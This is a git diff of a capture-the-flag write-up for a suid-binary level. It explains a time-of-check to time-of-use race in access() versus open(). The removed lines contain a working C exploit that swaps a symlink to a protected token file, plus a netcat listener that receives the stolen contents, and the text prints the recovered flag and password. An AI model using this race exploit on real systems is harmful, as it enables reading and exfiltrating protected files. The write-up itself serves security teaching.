@@ -1,53 +1,83 @@
 # Level 10
 
+## Analysis
 
-![alt text](image.png)
+Entering this level we list files in the directory we found 2 files:
+- 32-bit executable owned by `flag10` with suid bit set
+- a regular file containing some data named `token` with no read and write permissions for us, which likely containing the `flag`
 
+![alt text](/level10/resources/images/image.png)
 
+Executing the program without arguments results in message that we should provide a `file` and a `host`
 
-can't connect to 10.13.100.41.6969
-![alt text](image-1.png)
+Let's pass the `token` file and the **loop back address** as the `host`. Since we don't the read permission for the file
 
-
-let's trace the program
-
-![alt text](image-2.png)
-
-we found multiple syscalls and library calls:
-
-[access](/level10/resources/access.md )  is used to  check whether the file is readable
+![alt text](/level10/resources/images/image-7.png)
 
 
-**socket function**
+Let's create a file with some data and retry 
 
-from [socket.h](https://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html) we can find the value used in socket function parameter
+![alt text](/level10/resources/images/image-8.png)
 
-- domain : Specifies the communication domain or protocol family  
-
-    `AF_INET`: For IPv4 Internet protocols.
-
-**type** Specifies the type of socket, determining the communication semantics
-
-`SOCK_STREAM`: For connection-oriented, reliable, and ordered byte streams (e.g., TCP).
-
-in the third parameter `protocol` this is often set to 0, which means the system will automatically choose the appropriate default protocol
-
-![alt text](image-4.png)
-![alt text](image-5.png)
-
-**inet_addr function**
-The inet_addr() function shall convert the string pointed to by cp, in the standard IPv4 dotted decimal notation, to an integer value suitable for use as an Internet address.
-
-it returns `0x29640d0a ===> (694422794)10`
+The program tries to connect to the port 6969, but there is nothing to connect to
 
 
-![alt text](image-6.png)
+We can listen to upcomming connection on port `6969` using `nc` netcat
+
+![alt text](/level10/resources/images/image-11.png)
+![alt text](/level10/resources/images/image-10.png)
+
+The program connected to the port and wrote something that look like a face or a regex pattern and  the content of the file 
+
+Let's trace the library calls made by the program to understand what it does
+
+![alt text](/level10/resources/images/image-15.png)
 
 
-`woupa2yuojeeaaed06riuj63c`
-`feulo4b72j7edeahuete3no7c`
+Here is the major instructions done by the program : 
+
+- Checks if we have read permission of file passed
+- Creates a socket 
+- Connect to a listening socket on port `6969`
+- writes the regex pattern
+- opens the file with readonly mode
+- reads the data contained in the file and write it to the  socket
+
+reading through the access function's [linux manpage](https://man7.org/linux/man-pages/man2/access.2.html) we find an interesting things
+
+It says that the access function do the check of whether we have access to the file using the calling process's real UID,
+**which is the reason why we couldn't access the token through the executable with suid bit set** in the opposite the open doesn't check for the calling process' real UID **which means we can create a fake file to bypass the access function then replace it with our target file `token`**
 
 
+![](/level10/resources/images/image-2.png)
+
+but how we make this swap knowing that instructions are executed instantly ?
+The answer to this question is in the follwing warning found in the manapage
+
+
+![](/level10/resources/images/image-1.png)
+
+This vulnerability is called **Time-of-Check to Time-of-Use (TOCTOU)** is a class of software vulnerabilities that arise from race conditions. These vulnerabilities occur when there is a time gap between the checking of a system's state and the use of the results of that check. During this interval, an attacker can alter the state of the system, leading to unauthorized actions or security breaches.
+
+## Cracking Process
+
+
+To exploit this vulnerability we are going use threads for concurency
+
+
+![image showing how code](/level10/resources/images/image-6.png)
+ 
+![](/level10/resources/images/image-9.png)
+
+
+![alt text](/level10/resources/images/image-12.png)
+![alt text](/level10/resources/images/image-13.png)
+
+We got the flag `woupa2yuojeeaaed06riuj63c` we switch to `flag10` run  getflag and we get the password for the next level `feulo4b72j7edeahuete3no7c`
+
+
+
+## Read more
 
 https://superuser.com/questions/1008348/netcat-keep-listening-for-connection-in-debian
 
@@ -57,37 +87,3 @@ https://stackoverflow.com/questions/11525164/what-is-wrong-with-access
 
 https://stackoverflow.com/questions/14333112/access2-system-call-security-issue
 
-
-```bash
-nc -l -k 6969
-```
-
-```c
-#include <pthread.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-
-void* myThreadFunc(void* arg) {
-        printf("Thread is running...\n");
-	system("touch /tmp/badr/dawzer ; /home/user/level10/level10 /tmp/badr/dawzer 10.13.100.41");
-	sleep(1);
-    return NULL;
-}
-
-
-int main() {
-    pthread_t thread;
-
-    int i = 0;
-    while(i < 10) {
-	    pthread_create(&thread, NULL, myThreadFunc, NULL);
-	    system("ln -s /home/user/level10/token /tmp/badr/ ; mv /tmp/badr/token /tmp/badr/dawzer ; rm /tmp/badr/dawzer");
-	    pthread_join(thread, NULL);
-	    i++;
-    }
-
-
-    return 0;
-}
-```
